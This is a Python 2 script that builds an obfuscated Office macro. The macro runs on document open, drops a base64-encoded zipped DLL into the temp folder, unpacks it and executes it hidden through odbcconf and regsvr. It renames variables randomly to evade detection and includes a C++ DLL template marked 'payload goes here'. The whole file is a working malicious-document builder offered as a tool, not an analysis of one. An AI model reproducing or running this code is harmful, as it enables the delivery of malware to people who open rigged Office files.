#!/usr/bin/env python2
# -*- coding: utf-8 -*-
'''
script pour générer un vbs a partir d'une .dll au format office.
'''
import sys
import io
import pefile
import zipfile
import random
import argparse

def randstr(len=10):
    return ''.join(chr(random.randint(ord('a'), ord('z'))) for x in range(0, len))

def predicate():
    predicates = [
    'Dim var',
    'Dim var\nSet var = "' + randstr(random.randint(4, 16)) + '"',
    'Set var = CreateObject("' + randstr(random.randint(4, 16)) + '")'
    ]
    if random.randint(1, 3) == 1:
        return '\n'
    data = ''
    for i in range(0, random.randint(1, 3)):
        data += predicates[random.randint(0, len(predicates) - 1)].replace('var', randstr(random.randint(2, 4))) + '\n'
    return data

def obfuscate(data):
    for i in range(0, 1000):
        data = data.replace('VAR_' + str(i), randstr(random.randint(7, 40)))
    '''for i in data.split('\n'):
        obfuscated = ''
        obfuscated += i + '\n'
        obfuscated += predicate()
    return obfuscated'''
    return data

def zip(path, data):
    file_like_object = io.BytesIO()
    zipfile_ob = zipfile.ZipFile(file_like_object, 'w', zipfile.ZIP_DEFLATED)
    zipfile_ob.writestr(path, data, zipfile.ZIP_DEFLATED)
    zipfile_ob.close()
    return file_like_object.getvalue()

def generatepayload(sourcefile):
    zipname = '.{}.zip'.format(randstr(random.randint(10, 20)))
    exename = '.{}.db'.format(randstr(random.randint(10, 20)))
    script = '''
Private Sub Document_Open()
On Error Resume Next
Dim VAR_1
Dim VAR_2
Dim VAR_3
Set VAR_3=CreateObject(VAR_6("V1NjcmlwdC5TaGVsbA=="))
VAR_2 = VAR_3.ExpandEnvironmentStrings(VAR_6("JVRFTVAl") & VAR_6("XA==") & VAR_6("''' + zipname.encode('base64').replace('\n', '') + '''"))
Set VAR_4 = CreateObject(VAR_6("U2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3Q="))
If (VAR_4.FileExists(VAR_2)) Then
VAR_4.DeleteFile(VAR_2)
End If
Set VAR_5 = VAR_4.CreateTextFile(VAR_2, ForWriting)
'''
    rawfile = zip(exename, sourcefile.read()).encode('base64').split('\n')
    count = 0
    for line in rawfile:
        if len(line) > 1:
            script += 'VAR_5.Write VAR_6("'+line+'")\n'
    script += '''
VAR_5.Close
Dim VAR_7:Set VAR_7 = CreateObject(VAR_6("U2hlbGwuQXBwbGljYXRpb24="))
Dim VAR_8
VAR_8=VAR_3.ExpandEnvironmentStrings(VAR_6("JVRFTVAl" ))
VAR_8=VAR_8 & VAR_6("XA==") & VAR_6("''' + exename.encode('base64').replace('\n', '') + '''")
If (VAR_4.FileExists(VAR_8)) Then
VAR_4.DeleteFile(VAR_8)
End If
VAR_7.NameSpace(VAR_3.ExpandEnvironmentStrings(VAR_6("JVRFTVAl"))).CopyHere VAR_7.NameSpace(VAR_2).Items
VAR_4.DeleteFile(VAR_2)
Dim VAR_20
VAR_20 = VAR_6("Y21kIC9jIFNUQVJUIC9iIG9kYmNjb25mIC9zIC9hICB7cmVnc3ZyICV0ZW1wJVw=") & VAR_6("''' + exename.encode('base64').replace('\n', '') + '''") & VAR_6("fQ==")
VAR_3.Run VAR_20,0,True
WScript.Sleep(5000)
End Sub
Function VAR_6(VAR_10)
Dim VAR_11,VAR_12,VAR_13
VAR_10=Replace(VAR_10,vbCrLf,"")
VAR_10=Replace(VAR_10,vbTab,"")
VAR_10=Replace(VAR_10," ","")
VAR_11=Len(VAR_10)
For VAR_13=1 To VAR_11 Step 4
Dim VAR_14,VAR_15,VAR_16,VAR_17,VAR_18,VAR_19
VAR_14=3
VAR_18=0
For VAR_15=0 To 3
VAR_16=Mid(VAR_10,VAR_13+VAR_15,1)
If VAR_16="=" Then
VAR_14=VAR_14 - 1
VAR_17=0
Else
VAR_17=InStr(1, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",VAR_16,vbBinaryCompare) - 1
End If
VAR_18=64*VAR_18+VAR_17
Next
VAR_18=Hex(VAR_18)
VAR_18=String(6-Len(VAR_18),"0")&VAR_18
VAR_19=Chr(CByte("&H" & Mid(VAR_18,1,2))) + Chr(CByte("&H" & Mid(VAR_18,3,2))) + Chr(CByte("&H" & Mid(VAR_18,5,2)))
VAR_12=VAR_12 & Left(VAR_19,VAR_14)
Next
VAR_6=VAR_12
End Function
Document_Open
'''
    return obfuscate(script)

def print_error():
    print 'You must provide a DLL with DllRegisterServer export'
    sys.exit()

description = '''
//x86_64-w64-mingw32-g++ <>.cpp -o payload.dll -shared -fno-ident -Wl,--kill-at -Wl,--enable-stdcall-fixup -static-libstdc++ -static-libgcc -lwininet -Os -static
#include <windows.h>
extern "C" {
  void __declspec(dllexport) DllRegisterServer(void)
  {
    //payload goes here!
  }
}
'''

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Extract and execute a DLL from a VBS script')
    parser.add_argument('-i', type=argparse.FileType('r'), dest='inputfile', required=True)
    parser.add_argument('-o', type=argparse.FileType('w'), dest='outputfile', required=True)
    args = parser.parse_args()
    try:
        pe = pefile.PE(data=args.inputfile.read(), fast_load=True)
    except pefile.PEFormatError:
        print_error()
    pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]])
    try:
        if not any('DllRegisterServer' in e.name for e in pe.DIRECTORY_ENTRY_EXPORT.symbols):
            print_error()
    except AttributeError:
            print_error()
    args.inputfile.seek(0)
    args.outputfile.write(generatepayload(args.inputfile))
    args.outputfile.close()
    args.inputfile.close()
